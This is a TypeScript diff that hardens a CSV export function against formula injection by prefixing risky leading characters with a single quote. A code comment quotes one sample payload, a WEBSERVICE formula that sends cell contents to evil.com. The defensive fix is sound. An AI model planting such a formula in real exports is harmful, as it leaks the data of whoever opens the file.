@@ -1,3 +1,11 @@
+// Neutralize CSV formula injection — Excel/Sheets execute cells that start
+// with =, +, -, @, tab, or CR as formulas. Prefix with a single-quote so a
+// client/lead/booking name like `=WEBSERVICE("http://evil.com/"&A1)` lands as
+// inert text instead of running when the tenant admin opens the export.
+function neutralizeFormula(str: string): string {
+  return /^[=+\-@\t\r]/.test(str) ? `'${str}` : str
+}
+
 export function toCSV(data: Record<string, unknown>[], columns?: string[]): string {
   if (data.length === 0) return ''
   const cols = columns || Object.keys(data[0])
@@ -6,7 +14,7 @@ export function toCSV(data: Record<string, unknown>[], columns?: string[]): stri
     cols.map(col => {
       const val = row[col]
       if (val === null || val === undefined) return ''
-      const str = String(val)
+      const str = neutralizeFormula(String(val))
       return str.includes(',') || str.includes('"') || str.includes('\n')
         ? `"${str.replace(/"/g, '""')}"`
         : str
